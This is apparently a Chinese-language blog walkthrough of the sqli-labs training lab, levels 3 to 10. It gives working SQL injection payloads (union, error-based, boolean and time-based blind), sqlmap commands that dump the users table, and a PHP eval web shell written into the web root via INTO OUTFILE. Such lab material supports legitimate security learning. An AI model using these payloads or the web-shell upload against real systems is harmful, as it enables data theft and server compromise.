+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><h3 id="（union联合注入）-2"><a href="#（union联合注入）-2" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><p>1.比较输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-3/?id=2-1%E4%B8%8Ehttp://127.0.0.1/sql/Less-3/?id=2">http://127.0.0.1/sql/Less-3/?id=2-1与http://127.0.0.1/sql/Less-3/?id=2</a></p>
+<p>发现页面一致，判断为字符型；</p>
+<p>2：输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-3/?id=2%27%EF%BC%8C%E5%88%A4%E6%96%AD%E5%87%BA%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA">http://127.0.0.1/sql/Less-3/?id=2&#39;，判断出闭合方式为</a>‘)</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-20134159.png" alt="2024-11-20 134159"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,3--+，知在2，3为回显位；</span><br><span class="line"></span><br><span class="line">4.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,version(),database()--+，知数据库名为security；</span><br><span class="line"></span><br><span class="line">5.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+，猜测表名为users；</span><br><span class="line"></span><br><span class="line">6.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+，知字段有id,username,password；</span><br><span class="line"></span><br><span class="line">7.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(id,username,password) from users)--+</span><br></pre></td></tr></table></figure>
+
+<p>，得下图：<img src="/2025/07/11/sqli-labs/2024-11-20135444.png" alt="2024-11-20 135444"></p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><h3 id="（union联合注入）-3"><a href="#（union联合注入）-3" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><p>1.判断出为字符型</p>
+<p>2.输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-4/?id=2-1%22%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%8C%E5%88%A4%E6%96%AD%E5%87%BA%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA">http://127.0.0.1/sql/Less-4/?id=2-1&quot;，显示如下图，判断出闭合方式为</a>“)</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-20140054.png" alt="2024-11-20 140054"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">4.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br><span class="line"></span><br><span class="line">5.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+</span><br><span class="line"></span><br><span class="line">6.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(id,username,password) from users)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-20141723.png" alt="2024-11-20 141723"></p>
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>less-1：考察对单引号闭合的字符型；</p>
+<p>​            less-2：考察数字型；</p>
+<p>字符型与数字型比较，除了少一步判断闭合符号，其余步骤相同；</p>
+<p>​	    less-3：考察对单引号加括号的字符型；</p>
+<p>​	    less-4：考察对双引号加括号的字符型；</p>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="(extractvalue报错注入)"></a>(<strong>extractvalue</strong>报错注入)</h3><h4 id="step1：判断用什么注入、闭合符号-有无、有则是啥"><a href="#step1：判断用什么注入、闭合符号-有无、有则是啥" class="headerlink" title="step1：判断用什么注入、闭合符号(有无、有则是啥)"></a>step1：判断用什么注入、闭合符号(有无、有则是啥)</h4><p><img src="/2025/07/11/sqli-labs/2024-11-20201440.png" alt="2024-11-20 201440"></p>
+<p>输入id&#x3D;1和2页面回显一致，无法用union联合注入；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-20201706.png" alt="2024-11-20 201706"></p>
+<p>当多输入’<em>能显示报错信息</em>，故可以使用报错注入，且可知闭合符号为单引号；</p>
+<h4 id="step2：若为报错注入，运用extractvalue-得库名、表名、数据"><a href="#step2：若为报错注入，运用extractvalue-得库名、表名、数据" class="headerlink" title="step2：若为报错注入，运用extractvalue()得库名、表名、数据"></a>step2：若为报错注入，运用extractvalue()得库名、表名、数据</h4><p>（注：尝试得库名、表名、数据 的方法与 由union去得 的方法同理）</p>
+<p><strong>1.得库名：</strong></p>
+<p>输入语句：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1">http://127.0.0.1/sql/Less-5/?id=1</a>‘ union select 1,2,extractvalue(1,concat(0x7e,database()))–+</p>
+<p>​                                                                           （使用union select前要判断出有几列）</p>
+<p>​           或者（更推荐）：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=0">http://127.0.0.1/sql/Less-5/?id=0</a>‘ </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
+
+<p> 得下图：<img src="/2025/07/11/sqli-labs/2024-11-20204545.png" alt="2024-11-20 204545"></p>
+<p><strong>2.得表名：</strong></p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：</p>
+<p><em>Welcome    Dhakkan</em><br><em>XPATH syntax error: ‘~emails,referers,uagents,users’</em></p>
+<p><strong>3.得列名：</strong></p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：</p>
+<p><em>Welcome    Dhakkan</em><br><em>XPATH syntax error: ‘~id,username,password’</em></p>
+<h4 id="step3：获取数据，搭配substring"><a href="#step3：获取数据，搭配substring" class="headerlink" title="step3：获取数据，搭配substring()"></a>step3：获取数据，搭配substring()</h4><p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示如下图：<img src="/2025/07/11/sqli-labs/2024-11-20205402.png" alt="2024-11-20 205402"></p>
+<p>但报错注入显示的字符有限，一次只能显示32个，可以选择搭配substring()来显示更多：</p>
+<p>故再继续输入为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),32,32) from users)))--+</span><br></pre></td></tr></table></figure>
+
+<p>得下图：（后面则不断使用substring函数来继续获取）<img src="/2025/07/11/sqli-labs/2024-11-20210144.png" alt="2024-11-20 210144"></p>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><h3 id="（updatexml报错注入）"><a href="#（updatexml报错注入）" class="headerlink" title="（updatexml报错注入）"></a>（<strong>updatexml报错注入</strong>）</h3><p>1.当输入?id&#x3D;1和?id&#x3D;2页面回显相同，</p>
+<p>而当输入：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=2%22%EF%BC%8C">http://127.0.0.1/sql/Less-6/?id=2&quot;，</a></p>
+<p>显示报错信息：<em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“2”” LIMIT 0,1’ at line 1</em></p>
+<p>—-&gt;使用报错注入（此使用<strong>updatexml报错注入</strong>），闭合符号为双引号；</p>
+<p>2.输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,database()),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>XPATH syntax error: ‘~security’</em></p>
+<p>—-&gt;判断出库名为security</p>
+<p>3.输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>XPATH syntax error: ‘~emails,referers,uagents,users’</em></p>
+<p>—&gt;得表名，猜测在users表里</p>
+<p>4.输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>XPATH syntax error: ‘~id,username,password’</em></p>
+<p>—&gt;得列名；</p>
+<p>5.获取数据，</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(id,username,password) from users)),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>XPATH syntax error: ‘~1DumbDumb,2AngelinaI-kill-you,3’</em></p>
+<p>此报错注入方式只能一次性显示32个字符，故还得搭配substr或者substring使用；</p>
+<p>例如继续输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select substr(group_concat(id,username,password),30,60) from users)),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示如下图：<em>XPATH syntax error: ‘~,3Dummyp@ssword,4securecrappy,5’</em></p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-21170136.png" alt="2024-11-21 170136"></p>
+<h3 id="（floor报错注入）"><a href="#（floor报错注入）" class="headerlink" title="（floor报错注入）"></a>（floor报错注入）</h3><p><strong>1</strong>.输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=7%22%EF%BC%8C">http://127.0.0.1/sql/Less-6/?id=7&quot;，</a></p>
+<p>显示：<em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“7”” LIMIT 0,1’ at line 1</em></p>
+<p>判断出闭合符号为双引号；</p>
+<p><strong>2.判断列数：</strong></p>
+<ul>
+<li>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=7">http://127.0.0.1/sql/Less-6/?id=7</a>“ order by 4–+<ul>
+<li>显示<em>Unknown column ‘4’ in ‘order clause’</em>；</li>
+</ul>
+</li>
+<li>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=7">http://127.0.0.1/sql/Less-6/?id=7</a>“ order by 3–+<ul>
+<li>正常显示<em>You are in………..</em></li>
+</ul>
+</li>
+</ul>
+<p>故列数有3列；</p>
+<p><strong>3.查库名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,database(),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>Duplicate entry ‘security~1’ for key ‘’</em></p>
+<p><strong>4.查表名：</strong></p>
+<p>当输入 ?id&#x3D;1” union select 1,count(*),concat_ws(‘~’,(select table_name from information_schema.tables where table_schema&#x3D;’security’),floor(rand(0)*2)) as a from information_schema.tables group by a–+</p>
+<p>显示：<em>Subquery returns more than 1 row</em></p>
+<p>故可以加limit来限制输出的行数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>Duplicate entry ‘emails~1’ for key ‘’</em></p>
+<p>后续把limit后面的第一个参数不断修改，可以不断一行一行的获取表名；</p>
+<p>最后猜测在为users的表名里面；</p>
+<p><strong>5.查列名：</strong></p>
+<p>输入：（此为用limit x，1 来进行一行一行的获取，否则会显示<em>Subquery returns more than 1 row</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：Duplicate entry ‘id~1’ for key ‘’</p>
+<p>后续同理，各显示：</p>
+<p><em>Duplicate entry ‘username~1’ for key ‘’</em></p>
+<p>Duplicate entry ‘password~1’ for key ‘’</p>
+<p><strong>6.查数据：</strong></p>
+<p>输入 ?id&#x3D;1” union select 1,count(*),concat_ws(‘~’,(select group_concat(id,username,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a–+</p>
+<p>显示  <em>You are in………..</em></p>
+<p>可能是字数太多，可以把group_concat改为concat试一试：</p>
+<p>（concat函数里可以添加‘-’等等来分隔下要显示出来的信息）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select concat(&#x27;-&#x27;,id,username,&#x27;:&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>显示：<em>Duplicate entry ‘-1Dumb:Dumb~1’ for key ‘’</em></p>
+<p>后续同理，控制limit的参数即可；</p>
+<p>例如：<img src="/2025/07/11/sqli-labs/2024-11-22110630.png"></p>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h3 id="文件上传-webshell"><a href="#文件上传-webshell" class="headerlink" title="文件上传 webshell"></a>文件上传 webshell</h3><p>1.当输入?id&#x3D;1或者2，均回显：<em>You are in…. Use outfile……</em></p>
+<p>此提示用<strong>文件上传</strong>；</p>
+<p>2.判断闭合方式：</p>
+<ul>
+<li><p>?id&#x3D;1’和?id&#x3D;1’)和?id&#x3D;1’–+和?id&#x3D;1’)–+，均显示：<em>You have an error in your SQL syntax</em>   （</p>
+<ul>
+<li>故先排除单引号、单引号加 单括号的闭合；</li>
+</ul>
+</li>
+<li><p>?id&#x3D;1” 和?id&#x3D;1” )和?id&#x3D;1’))–+ ,均不报错，均显示：<em>You are in…. Use outfile……</em></p>
+<p>—-&gt;故应进一步验证</p>
+<ul>
+<li>?id&#x3D;1” and 1&#x3D;2 –+和?id&#x3D;1”) and 1&#x3D;2 –+仍不报错,但这语句本身是错的，故不是这两种闭合方式；</li>
+<li>?id&#x3D;1’)) and 1&#x3D;2 –+会报错，而?id&#x3D;1’)) and 1&#x3D;1 –+不报错，故应该是’))的闭合方式；</li>
+</ul>
+</li>
+</ul>
+<p>3.判断列数：</p>
+<ul>
+<li>输入：?id&#x3D;1’)) order by 4–+ <ul>
+<li>显示：<em>You have an error in your SQL syntax</em></li>
+</ul>
+</li>
+<li>再输入：?id&#x3D;1’)) order by 3–+<ul>
+<li>显示：<em>You are in…. Use outfile……</em></li>
+</ul>
+</li>
+</ul>
+<p> 故列数为3列；</p>
+<p>4.进行文件上传：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\pass.php&quot;--+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>（已知靶场路径为：C:\phpstudy_pro\WWW\sql）</p>
+<p>虽然页面显示报错：<em>You have an error in your SQL syntax</em>，但文件若能成功上传上去即可，之后可以用webshell去查看管理；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-23132911.png" alt="2024-11-23 132911"></p>
+<p>(检查确实上传到了，记得关靶场的windows实时保护，否则文件又会被删除)<img src="/2025/07/11/sqli-labs/2024-11-23133534.png" alt="2024-11-23 133534"></p>
+<p>5.使用蚁剑：</p>
+<p>输入信息后，点击测试连接，显示成功后则可以点击“添加”了；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-23133617.png" alt="2024-11-23 133617"></p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><h3 id="1-布尔盲注（简略）"><a href="#1-布尔盲注（简略）" class="headerlink" title="1.布尔盲注（简略）"></a>1.布尔盲注（简略）</h3><p>1.当为<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1">http://127.0.0.1/sql/Less-8/?id=1</a>‘ and sleep(2)–+  </p>
+<p>执行了sleep函数，说明闭合方式为单引号</p>
+<p>（注意：若sleep不执行不代表一定不是该方式，如less-15）</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-22164110.png" alt="2024-11-22 164110"></p>
+<p>又易发现页面有真假两状态，可以使用布尔注入：</p>
+<p>2.先判断数据库库名长度：</p>
+<p>当输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))=8--+</span><br><span class="line">//注意语句不固定，参考less-15；</span><br></pre></td></tr></table></figure>
+
+<p> 页面回显为真，故长度为8；</p>
+<p>3.再判断数据库库名每个字符具体值，尝试后，发现  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=116--+</span><br></pre></td></tr></table></figure>
+
+<p>页面为假，如下图：<img src="/2025/07/11/sqli-labs/2024-11-22165207.png" alt="2024-11-22 165207"></p>
+<p>而当输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=115--+</span><br></pre></td></tr></table></figure>
+
+<p>页面为真，如下图：<img src="/2025/07/11/sqli-labs/2024-11-22165345.png" alt="2024-11-22 165345"></p>
+<p>故可以判断出database库名的第一个字符的ASCII值为115，对应的字符为s；</p>
+<p>注意：当然，也可以不转为ASCII再进行比较，直接对字符进行比较例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (substr(database(),1,1))=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>页面显示为真；</p>
+<p>后续同理….</p>
+<h3 id="2-sql-map使用"><a href="#2-sql-map使用" class="headerlink" title="2.sql map使用"></a>2.sql map使用</h3><p>1.在windows 的sqlmap文件下打开cmd，输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-22172313.png" alt="2024-11-22 172313"></p>
+<p>说明此处有注入点，显示为布尔盲注or时间盲注；</p>
+<p>2.爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 --dbs</span><br></pre></td></tr></table></figure>
+
+<p>显示下图：<img src="/2025/07/11/sqli-labs/2024-11-22172632.png" alt="2024-11-22 172632"></p>
+<p>猜测在security的库里；</p>
+<p>3.爆表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; --tables</span><br></pre></td></tr></table></figure>
+
+<p>显示里有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<p>猜测在users表里；</p>
+<p>4.爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<p>显示里有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>5.爆数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p>显示有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><h3 id="1-时间盲注（简略）"><a href="#1-时间盲注（简略）" class="headerlink" title="1.时间盲注（简略）"></a>1.时间盲注（简略）</h3><p>1.因为无论输入id&#x3D;1‘或1“等等都只显示：<em>You are in………..</em></p>
+<p>无回显位，无报错信息，无真假页面，故尝试时间盲注；</p>
+<p>当输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(2)--+</span><br></pre></td></tr></table></figure>
+
+<p>网页等待了两秒才刷新，说明成功执行了sleep函数，故该题可以使用时间盲注，且闭合符号为单引号</p>
+<p>2.判断长度：</p>
+<p>如判断库名长度，尝试后发现当输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(2),sleep(0))--+</span><br></pre></td></tr></table></figure>
+
+<p>两秒后才回显，说明库名有8个字符；</p>
+<p>3.判断各具体对应的ASCII值：</p>
+<p>如判断库名：</p>
+<p>当输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))&lt;120,sleep(2),sleep(0))--+</span><br></pre></td></tr></table></figure>
+
+<p>页面两秒才回显，说明库名第一个字符的ASCII值小于120；</p>
+<p>后续，同理。。。。</p>
+<h3 id="2-sql-map使用-1"><a href="#2-sql-map使用-1" class="headerlink" title="2.sql map使用"></a>2.sql map使用</h3><p>语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -dbs</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; --tables</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; -T users -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p>最后得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>测试输入id&#x3D;xxx 、?id&#x3D;1’ and sleep(2)–+   均无变化；</p>
+<p>而当输入?id&#x3D;1” and sleep(2)–+ 页面等待了两秒，故可以进行时间盲注，且该题为双引号闭合；</p>
